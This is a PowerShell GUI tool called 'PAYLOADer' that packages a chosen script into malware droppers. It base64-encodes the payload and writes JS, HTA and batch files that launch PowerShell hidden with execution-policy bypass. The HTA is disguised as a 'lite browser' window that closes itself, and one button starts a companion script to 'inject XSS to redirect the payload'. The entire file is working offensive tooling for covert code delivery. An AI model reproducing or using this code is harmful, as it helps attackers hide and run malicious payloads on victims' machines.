Add-Type -AssemblyName system.windows.forms
Add-Type -AssemblyName system.drawing
Add-Type -AssemblyName system.net

$frm = New-Object System.Windows.Forms.Form
$frm.Size = New-Object System.Drawing.Size(600,400)
$frm.FormBorderStyle = 'fixedtoolwindow'
$frm.Font = New-Object System.Drawing.Font('Lucida console','8')
$frm.Text = "PAYLOADer"
$frm.BackColor = [System.Drawing.Color]::Black
$frm.ForeColor = [System.Drawing.Color]::LimeGreen

$file = New-Object System.Windows.Forms.TextBox
$file.Location = New-Object System.Drawing.Size(100,65)
$file.BorderStyle = 'FixedSingle'
$file.ReadOnly = $true
$file.size = New-Object System.Drawing.Size(200,0)
$file.BackColor = [System.Drawing.Color]::Black
$file.ForeColor = [System.Drawing.Color]::LimeGreen
$frm.Controls.Add($file)

$brw = New-Object System.Windows.Forms.Button
$brw.Text = "Browse payload"
$brw.Location = New-Object System.Drawing.Size(301,65)
$brw.Size = New-Object System.Drawing.Size(140,18)
$brw.Font = New-Object System.Drawing.Font('Lucida console','9')
$brw.FlatStyle = 'flat'
$brw.add_click({
    $obj = New-Object System.Windows.Forms.OpenFileDialog
    $obj.Filter = "Every exetentions|*.*|posh script|*.ps1|batch file|*.bat|linux shell|*.sh"
    $obj.ShowDialog()
    $filen = $obj.FileName
    if ($filen)
    {
        if (Test-Path $filen)
        {
            $file.Text = $filen
        }
    }
})
$frm.Controls.Add($brw)

$obtn = New-Object System.Windows.Forms.Button
$obtn.Location = New-Object System.Drawing.Size(240,105)
$obtn.Size = New-Object System.Drawing.Size(75,25)
$obtn.Text = 'One Line'
$obtn.FlatStyle = 'flat'
$obtn.add_click({
    if ($file.Text)
    {
        $cat = cat $($file.Text)
        if ($cat.count -eq 1)
        {
            $res.Text = "[-] The file is already one line"
            $res.ForeColor = 'red'
            $ress = 1
        } else {
            $res.ForeColor = 'limegreen'
            $res.Text = $null
            foreach ($tmp in ($cat))
            {
                $res.Text += "$tmp;"
                $ress = 0
            }
        }
    }
})
$frm.Controls.Add($obtn)

$res = New-Object System.Windows.Forms.TextBox
$res.Location = New-Object System.Drawing.Size(0,250)
$res.Multiline = $true
$res.BorderStyle = 'none'
$res.BackColor = 'black'
$res.ForeColor = 'limegreen'
$res.Size = New-Object System.Drawing.Size(590,120)
$frm.Controls.Add($res)

$jsbtn = New-Object System.Windows.Forms.Button
$jsbtn.Location = New-Object System.Drawing.Size(100,200)
$jsbtn.Size = New-Object System.Drawing.Size(100,25)
$jsbtn.Text = "To JS"
$jsbtn.add_Click({
        $tmp = cat $file.Text
        if ($tmp.count -eq 1)
        {
            $byte = [System.Text.Encoding]::Unicode.GetBytes($tmp)
            $enc = [System.Convert]::ToBase64String($byte)
            sc ./payload.js "posh = 'Powershell -executionpolicy bypass -w hidden -nologo -noprofile -e $enc';`nobj = new ActiveXObject(""WScript.Shell"").Run(posh,0,true);"
            $res.Text = $enc
            [System.Windows.Forms.MessageBox]::Show("saved to ./payload.js")
        } else {
            $byte = [System.Text.Encoding]::Unicode.GetBytes($res.Text)
            $enc = [System.Convert]::ToBase64String($byte)
            sc ./payload.js "posh = 'Powershell -executionpolicy bypass -w hidden -nologo -noprofile -e $enc';`nobj = new ActiveXObject(""WScript.Shell"").Run(posh,0,true);"
            $res.Text = $enc
            [System.Windows.Forms.MessageBox]::Show("saved to ./payload.js")
        }
})
$frm.Controls.Add($jsbtn)

$hta = New-Object System.Windows.Forms.Button
$hta.Location = New-Object System.Drawing.Size(250,200)
$hta.Size = New-Object System.Drawing.Size(100,25)
$hta.Text = "To HTA"
$hta.add_Click({
        $tmp = cat $file.Text
        if ($tmp.count -eq 1)
        {
            $byte = [System.Text.Encoding]::Unicode.GetBytes($tmp)
            $enc = [System.Convert]::ToBase64String($byte)
            sc ./payload.hta "
    <html>
        <head>
            <meta content=""text/html; charset=utf-8"" http-equiv=""Content-Type"" />
            <title>lite browser</title>
            <script language=""VBScript"">
                set obj = CreateObject(""Wscript.Shell"")
                obj.Run(""powershell -executionpolicy bypass -w hidden -nologo -noprofile -e $enc"")
                self.close()
            </script>
        <hta:application
           id=""lite""
           applicationname=""lite browser""
           application=""no""
        >
    </hta:application>
    </head>  
    <body>
    </body>
    </html>
    "
    $res.Text = $enc
            [System.Windows.Forms.MessageBox]::Show("saved to ./payload.hta")
        } else {
            $byte = [System.Text.Encoding]::Unicode.GetBytes($res.Text)
            $enc = [System.Convert]::ToBase64String($byte)
            sc ./payload.hta "
    <html>
        <head>
            <meta content=""text/html; charset=utf-8"" http-equiv=""Content-Type"" />
            <title>lite browser</title>
            <script language=""VBScript"">
                set obj = CreateObject(""Wscript.Shell"")
                obj.Run(""powershell -executionpolicy bypass -w hidden -nologo -noprofile -e $enc"")
                self.close()
            </script>
        <hta:application
           id=""lite""
           applicationname=""lite browser""
           application=""no""
        >
    </hta:application>
    </head>  
    <body>
    </body>
    </html>
    "
     $res.Text = $enc
            [System.Windows.Forms.MessageBox]::Show("saved to ./payload.hta")
        }
})
$frm.Controls.Add($hta)

$bat = New-Object System.Windows.Forms.Button
$bat.Text = 'To Batch'
$bat.Location = New-Object System.Drawing.Size(400,200)
$bat.Size = New-Object System.Drawing.Size(100,25)
$bat.add_Click({
    $tmp = cat $file.Text
        if ($tmp.count -eq 1)
        {
            $byte = [System.Text.Encoding]::Unicode.GetBytes($tmp)
            $enc = [System.Convert]::ToBase64String($byte)
            sc ./payload.bat "@Powershell -executionpolicy bypass -w hidden -nologo -noprofile -e $enc" -Encoding Ascii
            $res.Text = $enc
            [System.Windows.Forms.MessageBox]::Show("saved to ./payload.bat")
        } else {
            $byte = [System.Text.Encoding]::Unicode.GetBytes($res.Text)
            $enc = [System.Convert]::ToBase64String($byte)
            sc ./payload.bat "@Powershell -executionpolicy bypass -w hidden -nologo -noprofile -e $enc" -Encoding Ascii
            $res.Text = $enc
            [System.Windows.Forms.MessageBox]::Show("saved to ./payload.bat")
        }
})
$frm.Controls.Add($bat)
$xss = new-object System.Windows.Forms.Button
$xss.Size = New-Object System.Drawing.Size(400,20)
$xss.FlatStyle = 'popup'
$xss.Text = "inject XSS to redirect the payload"
$xss.Location = New-Object System.Drawing.Size(100,165)
$xss.add_click({
    sc ./tmp.bat "@powershell -executionpolicy bypass -noexit -nologo -noprofile -file ./payloader_xss.ps1" -Encoding Ascii
    start ./tmp.bat
})
$frm.Controls.Add($xss)
pwd

$frm.ShowDialog()


